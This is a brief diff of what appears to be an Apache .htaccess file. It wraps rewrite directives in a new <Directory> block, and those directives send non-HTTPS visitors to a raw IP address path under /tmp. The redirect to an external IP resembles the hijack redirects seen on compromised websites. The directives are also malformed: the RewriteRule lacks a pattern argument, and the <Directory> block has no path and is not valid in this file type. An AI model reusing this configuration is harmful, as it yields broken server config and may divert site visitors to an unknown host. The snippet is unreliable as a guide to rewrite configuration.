@@ -3,6 +3,8 @@
     Order allow,deny
     Deny from all
 </FilesMatch>
-RewriteEngine on
-RewriteCond %{HTTPS} !=on
-RewriteRule https://164.8.230.124/tmp/snapcomp/index.php
+<Directory>
+  RewriteEngine on
+  RewriteCond %{HTTPS} !=on
+  RewriteRule https://164.8.230.124/tmp/snapcomp/index.php
+</Directory>
